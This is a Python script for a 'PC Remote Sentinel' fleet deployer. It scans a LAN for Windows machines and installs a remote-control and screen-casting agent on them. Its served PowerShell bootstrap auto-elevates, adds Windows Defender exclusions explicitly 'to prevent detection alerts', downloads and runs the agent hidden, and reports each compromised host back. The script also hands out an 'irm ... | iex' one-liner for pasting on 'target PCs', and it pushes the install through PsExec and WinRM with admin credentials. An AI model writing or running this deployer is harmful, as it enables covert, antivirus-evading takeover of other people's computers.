#!/usr/bin/env python3
"""
==========================================================================
  PC REMOTE SENTINEL — NETWORK FLEET DEPLOYER
==========================================================================
  Mass-deploy PC-Remote-Sentinel to all PCs on your WiFi/LAN network.

  Two deployment modes:
    1. PULL MODE  — Paste a one-liner on each PC (5 seconds per PC)
    2. PUSH MODE  — Remotely install on PCs where you know the password

  Usage:
    python network_deployer.py
==========================================================================
"""

import os
import sys
import json
import socket
import subprocess
import threading
import time
import http.server
import socketserver
import shutil
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ========================================================================
# CONFIGURATION
# ========================================================================

DEPLOY_PORT = 9090
DEPLOY_DIR = os.path.dirname(os.path.abspath(__file__))
INSTALL_DEST = r"C:\PCSentinel"
FLEET_LOG_FILE = os.path.join(DEPLOY_DIR, "fleet_deploy_log.json")

AGENT_CORE_FILES = [
    "agent.py",
    "fleet_relay.py",
    "system_controller.py",
    "screen_caster.py",
    "requirements_agent.txt",
    "start_agent.bat",
    "start_agent_hidden.vbs",
    "deploy_config.env",
    "install.bat",
    "uninstall.bat",
]

# Large optional files — downloaded only if needed
OPTIONAL_LARGE_FILES = [
    "python-installer.exe",
]

# ========================================================================
# UTILITY FUNCTIONS
# ========================================================================

def get_local_ip():
    """Get this machine's local IP address on the LAN."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def get_subnet():
    """Get the local /24 subnet."""
    ip = get_local_ip()
    parts = ip.split(".")
    return f"{parts[0]}.{parts[1]}.{parts[2]}"


def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log_deployment(pc_name, ip, status, method="pull"):
    """Log deployment result to fleet_deploy_log.json."""
    entry = {
        "pc_name": pc_name,
        "ip": ip,
        "status": status,
        "method": method,
        "timestamp": get_timestamp(),
    }
    try:
        if os.path.exists(FLEET_LOG_FILE):
            with open(FLEET_LOG_FILE, "r") as f:
                log = json.load(f)
        else:
            log = {"deployments": []}

        existing = next((d for d in log["deployments"] if d["ip"] == ip), None)
        if existing:
            existing.update(entry)
        else:
            log["deployments"].append(entry)

        with open(FLEET_LOG_FILE, "w") as f:
            json.dump(log, f, indent=4)
    except Exception:
        pass


# ========================================================================
# NETWORK SCANNER — Uses ARP table (much more reliable than ping)
# ========================================================================

def scan_network_arp():
    """
    Scan using the ARP table — finds all devices the router knows about.
    This is MUCH more reliable than ping on Windows networks where
    ICMP is blocked by firewall by default.
    """
    discovered = []
    my_ip = get_local_ip()
    subnet = get_subnet()

    print(f"\n  [*] Scanning network using ARP table + NetBIOS...")
    print(f"  [*] Local IP: {my_ip}, Subnet: {subnet}.0/24\n")

    # Step 1: Ping sweep to populate ARP table (fast broadcast)
    # Send a single broadcast ping to populate the ARP cache
    try:
        subprocess.run(
            ["ping", "-n", "1", "-w", "500", f"{subnet}.255"],
            capture_output=True, timeout=5,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    except Exception:
        pass

    # Quick parallel ping sweep to populate ARP table further
    def quick_ping(ip):
        try:
            subprocess.run(
                ["ping", "-n", "1", "-w", "300", ip],
                capture_output=True, timeout=3,
                creationflags=subprocess.CREATE_NO_WINDOW,
            )
        except Exception:
            pass

    print("  [*] Running quick ARP population sweep...")
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(quick_ping, f"{subnet}.{i}") for i in range(1, 255)]
        for f in as_completed(futures):
            pass  # just wait for all to complete

    time.sleep(1)

    # Step 2: Read the ARP table
    try:
        result = subprocess.run(
            ["arp", "-a"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        arp_output = result.stdout
    except Exception:
        arp_output = ""

    # Step 3: Also use PowerShell Get-NetNeighbor for more complete results
    ps_neighbors = ""
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-NetNeighbor -AddressFamily IPv4 | Where-Object {$_.State -ne 'Unreachable'} | Select-Object IPAddress, LinkLayerAddress, State | Format-Table -AutoSize"],
            capture_output=True, text=True, timeout=15,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        ps_neighbors = result.stdout
    except Exception:
        pass

    # Parse ARP table entries
    seen_ips = set()
    import re

    # Parse standard arp -a output
    for line in arp_output.splitlines():
        line = line.strip()
        # Match lines like: 192.168.1.5     aa-bb-cc-dd-ee-ff     dynamic
        match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F-]+)\s+(\w+)', line)
        if match:
            ip = match.group(1)
            mac = match.group(2)
            entry_type = match.group(3).lower()
            if ip == my_ip or ip.endswith(".255") or ip.endswith(".1"):
                continue
            if mac == "ff-ff-ff-ff-ff-ff":
                continue
            if ip.startswith(subnet):
                seen_ips.add(ip)

    # Parse PowerShell Get-NetNeighbor output
    for line in ps_neighbors.splitlines():
        match = re.match(r'(\d+\.\d+\.\d+\.\d+)', line.strip())
        if match:
            ip = match.group(1)
            if ip != my_ip and ip.startswith(subnet) and not ip.endswith(".255"):
                seen_ips.add(ip)

    # Step 4: Try to get hostname and check if Windows via NetBIOS
    def check_host(ip):
        hostname = "Unknown"
        is_windows = False
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except Exception:
            pass

        # Check SMB port (445) — strong indicator of Windows
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 445))
            sock.close()
            if result == 0:
                is_windows = True
        except Exception:
            pass

        # Also try NetBIOS name (137) as backup
        if not is_windows:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, 135))
                sock.close()
                if result == 0:
                    is_windows = True
            except Exception:
                pass

        return {"ip": ip, "hostname": hostname, "is_windows": is_windows}

    print(f"  [*] Found {len(seen_ips)} devices in ARP table, checking each...")

    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check_host, ip): ip for ip in seen_ips}
        for future in as_completed(futures):
            result = future.result()
            discovered.append(result)
            tag = "Windows" if result["is_windows"] else "Device"
            print(f"    [+] {result['ip']:16s} ({result['hostname']}) [{tag}]")

    discovered.sort(key=lambda x: [int(p) for p in x["ip"].split(".")])
    return discovered


# ========================================================================
# HTTP DEPLOYMENT SERVER
# ========================================================================

class DeployRequestHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP handler that serves installer files and the bootstrap script."""

    server_ip = "0.0.0.0"
    deploy_dir = DEPLOY_DIR

    def log_message(self, format, *args):
        client_ip = self.client_address[0]
        msg = format % args
        if "/install" in self.path or "/files/" in self.path or self.path == "/":
            print(f"  [{get_timestamp()}] {client_ip} -> {msg}")

    def do_GET(self):
        if self.path == "/install" or self.path == "/install/":
            self.serve_bootstrap_script()
        elif self.path == "/status":
            self.serve_status_page()
        elif self.path.startswith("/files/"):
            self.serve_deploy_file()
        elif self.path == "/report":
            self.serve_report_endpoint()
        elif self.path == "/":
            self.serve_landing_page()
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == "/report":
            self.handle_report_post()
        else:
            self.send_error(404)

    def serve_bootstrap_script(self):
        """Serve the PowerShell bootstrap that downloads and installs everything."""
        server_ip = self.server_ip
        port = DEPLOY_PORT

        # Build file list — only core files + optional if they exist
        core_list = ", ".join([f'"{f}"' for f in AGENT_CORE_FILES])
        optional_list = ", ".join([
            f'"{f}"' for f in OPTIONAL_LARGE_FILES
            if os.path.exists(os.path.join(self.deploy_dir, f))
        ])

        ps_script = f'''
$ErrorActionPreference = "SilentlyContinue"
$ServerURL = "http://{server_ip}:{port}"
$DestDir   = "C:\\PCSentinel"

# --- Auto-elevate to admin ---
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {{
    Write-Host "[*] Requesting Administrator privileges..."
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("irm $ServerURL/install | iex"))
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded" -Verb RunAs
    exit
}}

Write-Host ""
Write-Host "======================================================"
Write-Host "  PC REMOTE SENTINEL - Network Auto-Installer"
Write-Host "======================================================"
Write-Host ""

# --- 1. Add Windows Defender exclusions FIRST (prevents detection alerts) ---
Write-Host "[*] Configuring Windows Defender exclusions..."
try {{
    Add-MpPreference -ExclusionPath "C:\\PCSentinel" -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:TEMP\\PCSentinel_Install" -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "pc-sentinel-agent.exe" -Force -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "python.exe" -Force -ErrorAction SilentlyContinue
    Write-Host "  [OK] Defender exclusions configured."
}} catch {{
    Write-Host "  [~] Could not set Defender exclusions (non-critical)."
}}

# --- 2. Create install directory ---
$TempDir = "$env:TEMP\\PCSentinel_Install"
if (Test-Path $TempDir) {{ Remove-Item $TempDir -Recurse -Force }}
New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
if (-not (Test-Path $DestDir)) {{ New-Item -ItemType Directory -Path $DestDir -Force | Out-Null }}

# --- 3. Download only the essential agent files ---
Write-Host "[*] Downloading agent files from $ServerURL ..."
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$coreFiles = @({core_list})

$downloadedCount = 0
foreach ($file in $coreFiles) {{
    try {{
        $url  = "$ServerURL/files/$file"
        $dest = Join-Path $TempDir $file
        Write-Host "  [>] $file"
        (New-Object Net.WebClient).DownloadFile($url, $dest)
        $downloadedCount++
    }} catch {{
        Write-Host "  [!] Failed: $file"
    }}
}}

# --- 4. Check if Python exists before downloading the installer ---
$hasPython = $false
try {{
    $pyTest = & python -c "import sys; print(sys.executable)" 2>$null
    if ($LASTEXITCODE -eq 0 -and $pyTest -and ($pyTest -notlike "*WindowsApps*")) {{ $hasPython = $true }}
}} catch {{ }}

if (-not $hasPython) {{
    try {{
        $pyTest = & py -3 -c "import sys; print(sys.executable)" 2>$null
        if ($LASTEXITCODE -eq 0 -and $pyTest) {{ $hasPython = $true }}
    }} catch {{ }}
}}

if (-not $hasPython) {{
    # Check common paths
    $pyPaths = @(
        "C:\\Program Files\\Python314\\python.exe",
        "C:\\Program Files\\Python313\\python.exe",
        "C:\\Program Files\\Python312\\python.exe",
        "C:\\Program Files\\Python311\\python.exe",
        "C:\\Program Files\\Python310\\python.exe",
        "C:\\Python314\\python.exe",
        "C:\\Python313\\python.exe",
        "C:\\Python312\\python.exe",
        "C:\\Python311\\python.exe",
        "C:\\Python310\\python.exe",
        "$env:LOCALAPPDATA\\Programs\\Python\\Python314\\python.exe",
        "$env:LOCALAPPDATA\\Programs\\Python\\Python313\\python.exe",
        "$env:LOCALAPPDATA\\Programs\\Python\\Python312\\python.exe",
        "$env:LOCALAPPDATA\\Programs\\Python\\Python311\\python.exe",
        "$env:LOCALAPPDATA\\Programs\\Python\\Python310\\python.exe"
    )
    foreach ($p in $pyPaths) {{
        if (Test-Path $p) {{ $hasPython = $true; break }}
    }}
}}

if (-not $hasPython) {{
    try {{
        $cmdPy = (Get-Command python -ErrorAction SilentlyContinue).Source
        if ($cmdPy -and (Test-Path $cmdPy) -and ($cmdPy -notlike "*WindowsApps*")) {{
            $hasPython = $true
        }}
    }} catch {{ }}
}}

if (-not $hasPython) {{
    Write-Host "[*] Python not found - downloading installer..."
    try {{
        $url  = "$ServerURL/files/python-installer.exe"
        $dest = Join-Path $TempDir "python-installer.exe"
        (New-Object Net.WebClient).DownloadFile($url, $dest)
        $downloadedCount++
        Write-Host "  [OK] Python installer downloaded."
    }} catch {{
        Write-Host "  [~] Python installer not available from server, install.bat will handle it."
    }}
}} else {{
    Write-Host "[OK] Python already installed, skipping installer download."
}}

Write-Host ""
Write-Host "[*] Downloaded $downloadedCount files."

# --- 5. Run install.bat silently ---
if (Test-Path (Join-Path $TempDir "install.bat")) {{
    Write-Host "[*] Running silent installer..."
    $proc = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$(Join-Path $TempDir 'install.bat')`" /SILENT" -Wait -PassThru -WindowStyle Hidden
    Write-Host "[OK] Install complete (exit code: $($proc.ExitCode))"
}} else {{
    Write-Host "[X] ERROR: install.bat not downloaded."
    Start-Sleep -Seconds 5
    exit 1
}}

# --- 6. Verify the agent is actually running ---
Start-Sleep -Seconds 5
$agentRunning = Get-Process -Name "pc-sentinel-agent" -ErrorAction SilentlyContinue
if ($agentRunning) {{
    Write-Host "[OK] Agent process confirmed running!"
}} else {{
    Write-Host "[*] Starting agent manually..."
    $vbsPath = Join-Path $DestDir "start_agent_hidden.vbs"
    if (Test-Path $vbsPath) {{
        Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WorkingDirectory $DestDir
        Start-Sleep -Seconds 3
        $agentRunning = Get-Process -Name "pc-sentinel-agent" -ErrorAction SilentlyContinue
        if ($agentRunning) {{
            Write-Host "[OK] Agent started successfully!"
        }} else {{
            # Direct launch as last resort
            Write-Host "[*] Trying direct Python launch..."
            $pyCmd = $null
            foreach ($p in @("python", "C:\\Program Files\\Python311\\python.exe", "C:\\Program Files\\Python312\\python.exe")) {{
                try {{
                    & $p -c "import sys" 2>$null
                    if ($LASTEXITCODE -eq 0) {{ $pyCmd = $p; break }}
                }} catch {{ }}
            }}
            if ($pyCmd) {{
                Start-Process $pyCmd -ArgumentList "`"$DestDir\\agent.py`"" -WorkingDirectory $DestDir -WindowStyle Hidden
                Write-Host "[OK] Agent launched via Python directly."
            }}
        }}
    }}
}}

# --- 7. Report back to deploy server ---
try {{
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -notlike "*Loopback*" -and $_.PrefixOrigin -ne "WellKnown" }} | Select-Object -First 1).IPAddress
    $body = @{{
        pc_name = $env:COMPUTERNAME
        ip      = $localIP
        status  = "installed"
    }} | ConvertTo-Json
    Invoke-RestMethod -Uri "$ServerURL/report" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 10 | Out-Null
}} catch {{ }}

# --- 8. Cleanup ---
Start-Sleep -Seconds 2
Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "======================================================"
Write-Host "  [OK] PC SENTINEL IS NOW ACTIVE ON THIS PC!"
Write-Host "  PC Name: $env:COMPUTERNAME"
Write-Host "  You can close this window."
Write-Host "======================================================"
Start-Sleep -Seconds 3
'''
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(ps_script.encode("utf-8"))

    def serve_deploy_file(self):
        """Serve a specific file from the deploy directory."""
        filename = self.path.replace("/files/", "")
        # Security: prevent path traversal
        if ".." in filename or "/" in filename or "\\" in filename:
            self.send_error(403)
            return
        filepath = os.path.join(self.deploy_dir, filename)
        if os.path.exists(filepath) and os.path.isfile(filepath):
            file_size = os.path.getsize(filepath)
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(file_size))
            self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
            self.end_headers()
            with open(filepath, "rb") as f:
                shutil.copyfileobj(f, self.wfile)
        else:
            self.send_error(404, f"File not found: {filename}")

    def serve_landing_page(self):
        """Serve a simple landing page with the one-liner command."""
        server_ip = self.server_ip
        one_liner = f'powershell -ep bypass -c "irm http://{server_ip}:{DEPLOY_PORT}/install | iex"'

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>PC Remote Sentinel - Network Deployer</title>
    <meta charset="utf-8">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 20px;
            padding: 40px;
            max-width: 700px;
            width: 90%;
            text-align: center;
        }}
        h1 {{
            font-size: 28px;
            margin-bottom: 10px;
            background: linear-gradient(90deg, #00f5a0, #00d9f5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }}
        .subtitle {{ color: #888; margin-bottom: 30px; }}
        .command-box {{
            background: #1a1a2e;
            border: 1px solid #00f5a0;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
            position: relative;
        }}
        .command-box label {{
            display: block;
            color: #00f5a0;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
        }}
        .command-box code {{
            display: block;
            font-family: 'Cascadia Code', 'Consolas', monospace;
            font-size: 13px;
            color: #fff;
            word-break: break-all;
            white-space: pre-wrap;
        }}
        .copy-btn {{
            position: absolute;
            top: 10px;
            right: 10px;
            background: #00f5a0;
            color: #000;
            border: none;
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            font-size: 12px;
        }}
        .copy-btn:hover {{ background: #00d9f5; }}
        .steps {{ text-align: left; margin: 20px 0; }}
        .steps li {{ padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }}
        .steps li:last-child {{ border: none; }}
        .badge {{
            display: inline-block;
            background: #00f5a033;
            color: #00f5a0;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: bold;
            margin-right: 8px;
        }}
        .status {{ margin-top: 30px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1); }}
        .status a {{ color: #00d9f5; text-decoration: none; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>PC Remote Sentinel</h1>
        <p class="subtitle">Network Fleet Deployer - Active</p>

        <div class="command-box">
            <label>Paste this on any target PC (Win+R or PowerShell):</label>
            <code id="cmd">{one_liner}</code>
            <button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('cmd').textContent); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy',2000);">Copy</button>
        </div>

        <ol class="steps">
            <li><span class="badge">1</span> Go to the target PC</li>
            <li><span class="badge">2</span> Press <strong>Win+R</strong>, paste the command above, hit Enter</li>
            <li><span class="badge">3</span> Walk away - install runs silently in ~60 seconds</li>
        </ol>

        <div class="status">
            <a href="/status">View deployment status &rarr;</a>
        </div>
    </div>
</body>
</html>"""
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def serve_status_page(self):
        """Serve deployment log as JSON."""
        try:
            if os.path.exists(FLEET_LOG_FILE):
                with open(FLEET_LOG_FILE, "r") as f:
                    data = f.read()
            else:
                data = json.dumps({"deployments": [], "message": "No deployments yet"})
        except Exception:
            data = json.dumps({"error": "Could not read log"})

        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.end_headers()
        self.wfile.write(data.encode("utf-8"))

    def handle_report_post(self):
        """Handle POST from PCs reporting successful install."""
        try:
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length).decode("utf-8")
            data = json.loads(body)
            pc_name = data.get("pc_name", "Unknown")
            ip = data.get("ip", self.client_address[0])
            status = data.get("status", "reported")
            log_deployment(pc_name, ip, status, method="pull")
            print(f"\n  ** DEPLOYED: {pc_name} ({ip}) **\n")
        except Exception as e:
            print(f"  [!] Error processing report: {e}")

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "ok"}')

    def serve_report_endpoint(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "ready"}')


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


# ========================================================================
# PUSH DEPLOYMENT
# ========================================================================

def push_deploy_psexec(ip, username, password, server_ip):
    """Push-deploy using PsExec."""
    psexec_path = shutil.which("psexec") or shutil.which("PsExec")
    if not psexec_path:
        psexec_local = os.path.join(DEPLOY_DIR, "PsExec.exe")
        if os.path.exists(psexec_local):
            psexec_path = psexec_local
        else:
            return False, "PsExec.exe not found. Download from: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec"

    cmd = [
        psexec_path, f"\\\\{ip}",
        "-u", username, "-p", password,
        "-h", "-d", "-accepteula",
        "powershell.exe", "-ep", "bypass", "-c",
        f'irm http://{server_ip}:{DEPLOY_PORT}/install | iex',
    ]

    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        if result.returncode == 0:
            return True, "PsExec push successful"
        else:
            return False, f"PsExec error (code {result.returncode}): {result.stderr[:200]}"
    except subprocess.TimeoutExpired:
        return False, "PsExec timed out"
    except Exception as e:
        return False, f"PsExec error: {str(e)}"


def push_deploy_winrm(ip, username, password, server_ip):
    """Push-deploy using WinRM."""
    ps_cmd = f'''
$secPass = ConvertTo-SecureString '{password}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{username}', $secPass)
Invoke-Command -ComputerName '{ip}' -Credential $cred -ScriptBlock {{
    powershell -ep bypass -c "irm http://{server_ip}:{DEPLOY_PORT}/install | iex"
}}
'''
    try:
        result = subprocess.run(
            ["powershell", "-NoProfile", "-ep", "bypass", "-Command", ps_cmd],
            capture_output=True, text=True, timeout=120,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        if result.returncode == 0:
            return True, "WinRM push successful"
        else:
            return False, f"WinRM error: {result.stderr[:200]}"
    except subprocess.TimeoutExpired:
        return False, "WinRM timed out"
    except Exception as e:
        return False, f"WinRM error: {str(e)}"


def push_deploy(ip, username, password, server_ip):
    """Try push deployment using available methods."""
    success, msg = push_deploy_psexec(ip, username, password, server_ip)
    if success:
        return True, msg
    success, msg = push_deploy_winrm(ip, username, password, server_ip)
    return success, msg


# ========================================================================
# INTERACTIVE MENU
# ========================================================================

def print_banner():
    os.system("cls" if sys.platform == "win32" else "clear")
    print("""
  ===========================================================
       PC REMOTE SENTINEL - NETWORK FLEET DEPLOYER
  ===========================================================

   Deploy to 100+ PCs over WiFi - no USB needed!
    """)


def print_one_liner(server_ip):
    one_liner = f'powershell -ep bypass -c "irm http://{server_ip}:{DEPLOY_PORT}/install | iex"'
    print(f"""
  -----------------------------------------------------------
   INSTALL COMMAND (paste on target PCs):
  -----------------------------------------------------------

   {one_liner}

   How to use:
     1. Go to target PC
     2. Press  Win + R  (Run dialog)
     3. Paste the command above
     4. Press Enter - walk away, done!

   Or open browser to: http://{server_ip}:{DEPLOY_PORT}
   to copy the command easily.
  -----------------------------------------------------------
    """)


def interactive_menu(server_ip):
    """Interactive command menu for the deployer."""
    while True:
        print(f"""
  ===========================================================
              DEPLOYER MENU
  ===========================================================
   [1] Show install one-liner command
   [2] Scan network for PCs
   [3] Push-install to a specific PC
   [4] Push-install to all found PCs
   [5] View deployment status/log
   [6] Copy one-liner to clipboard
   [Q] Quit (server keeps running)
  ===========================================================
        """)
        choice = input("  Enter choice: ").strip().lower()

        if choice == "1":
            print_one_liner(server_ip)

        elif choice == "2":
            discovered = scan_network_arp()
            windows_pcs = [d for d in discovered if d["is_windows"]]
            other = [d for d in discovered if not d["is_windows"]]
            print(f"\n  ==========================================")
            print(f"  Found {len(discovered)} devices total:")
            print(f"    Windows PCs: {len(windows_pcs)}")
            print(f"    Other:       {len(other)}")
            print(f"  ==========================================")
            if windows_pcs:
                print(f"\n  Windows PCs found:")
                for i, pc in enumerate(windows_pcs, 1):
                    print(f"    [{i}] {pc['ip']:16s}  {pc['hostname']}")
            print()

        elif choice == "3":
            ip = input("  Target PC IP address: ").strip()
            username = input("  Admin username (e.g., Admin): ").strip()
            password = input("  Admin password: ").strip()
            print(f"\n  [*] Attempting push-deploy to {ip}...")
            success, msg = push_deploy(ip, username, password, server_ip)
            if success:
                print(f"  SUCCESS: {msg}")
                log_deployment(socket.gethostbyaddr(ip)[0] if ip else "Unknown", ip, "installed", "push")
            else:
                print(f"  FAILED: {msg}")
                print(f"  TIP: Use the one-liner method instead (option 1)")

        elif choice == "4":
            print("\n  [*] First, scanning the network...")
            discovered = scan_network_arp()
            windows_pcs = [d for d in discovered if d["is_windows"]]
            if not windows_pcs:
                print("  [!] No Windows PCs found on the network.")
                continue
            print(f"\n  Found {len(windows_pcs)} Windows PCs.")
            username = input("  Admin username for all PCs: ").strip()
            password = input("  Admin password for all PCs: ").strip()
            confirm = input(f"  Push-install to {len(windows_pcs)} PCs? (y/n): ").strip().lower()
            if confirm == "y":
                success_count = 0
                fail_count = 0
                for pc in windows_pcs:
                    print(f"\n  [*] Deploying to {pc['ip']} ({pc['hostname']})...")
                    success, msg = push_deploy(pc["ip"], username, password, server_ip)
                    if success:
                        print(f"    OK: {msg}")
                        log_deployment(pc["hostname"], pc["ip"], "installed", "push")
                        success_count += 1
                    else:
                        print(f"    FAIL: {msg}")
                        fail_count += 1
                print(f"\n  ==========================================")
                print(f"  Push deployment complete!")
                print(f"    Succeeded: {success_count}")
                print(f"    Failed:    {fail_count}")
                print(f"  ==========================================")

        elif choice == "5":
            if os.path.exists(FLEET_LOG_FILE):
                with open(FLEET_LOG_FILE, "r") as f:
                    log = json.load(f)
                deployments = log.get("deployments", [])
                if deployments:
                    print(f"\n  === DEPLOYMENT LOG ({len(deployments)} PCs) ===\n")
                    for d in deployments:
                        status_icon = "OK" if d["status"] == "installed" else "FAIL"
                        print(
                            f"    [{status_icon}]  {d.get('pc_name', 'N/A'):20s}  "
                            f"{d['ip']:16s}  [{d['method']}]  {d['timestamp']}"
                        )
                    print()
                else:
                    print("\n  No deployments logged yet.\n")
            else:
                print("\n  No deployment log file found yet.\n")

        elif choice == "6":
            one_liner = f'powershell -ep bypass -c "irm http://{server_ip}:{DEPLOY_PORT}/install | iex"'
            try:
                subprocess.run(
                    ["clip.exe"], input=one_liner.encode(), check=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                )
                print("\n  Copied to clipboard! Paste it on target PCs.\n")
            except Exception:
                print(f"\n  One-liner:\n  {one_liner}\n")

        elif choice == "q":
            print("\n  Server continues running. Close the window to stop.\n")
            break


# ========================================================================
# MAIN
# ========================================================================

def main():
    print_banner()

    server_ip = get_local_ip()

    # Check which files exist
    available = []
    missing = []
    for f in AGENT_CORE_FILES:
        path = os.path.join(DEPLOY_DIR, f)
        if os.path.exists(path):
            size_kb = os.path.getsize(path) / 1024
            available.append((f, size_kb))
        else:
            missing.append(f)

    optional_available = []
    for f in OPTIONAL_LARGE_FILES:
        path = os.path.join(DEPLOY_DIR, f)
        if os.path.exists(path):
            size_mb = os.path.getsize(path) / (1024 * 1024)
            optional_available.append((f, size_mb))

    print(f"  Server IP:  {server_ip}")
    print(f"  Port:       {DEPLOY_PORT}")
    print(f"  Core files: {len(available)} ready")
    if optional_available:
        print(f"  Optional:   {', '.join(f[0] for f in optional_available)}")
    if missing:
        print(f"\n  WARNING: Missing files:")
        for f in missing:
            print(f"     - {f}")

    # Check critical files
    critical_missing = [f for f in missing if f in ("agent.py", "install.bat", "deploy_config.env")]
    if critical_missing:
        print(f"\n  CRITICAL: Missing: {', '.join(critical_missing)}")
        print(f"  Cannot start. Ensure these files exist in: {DEPLOY_DIR}")
        input("\n  Press Enter to exit...")
        return

    # Start HTTP server
    handler = DeployRequestHandler
    handler.server_ip = server_ip
    handler.deploy_dir = DEPLOY_DIR

    server = ThreadedHTTPServer(("0.0.0.0", DEPLOY_PORT), handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()

    print(f"\n  Deploy server is LIVE at http://{server_ip}:{DEPLOY_PORT}")
    print_one_liner(server_ip)

    # Copy to clipboard
    one_liner = f'powershell -ep bypass -c "irm http://{server_ip}:{DEPLOY_PORT}/install | iex"'
    try:
        subprocess.run(
            ["clip.exe"], input=one_liner.encode(), check=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        print(f"  ONE-LINER COPIED TO YOUR CLIPBOARD!\n")
    except Exception:
        pass

    # Interactive menu
    try:
        interactive_menu(server_ip)
        print(f"  Deploy server still active at http://{server_ip}:{DEPLOY_PORT}")
        print(f"  Press Ctrl+C to shut down.\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n  Shutting down deploy server...")
        server.shutdown()
        print("  Server stopped.")


if __name__ == "__main__":
    main()
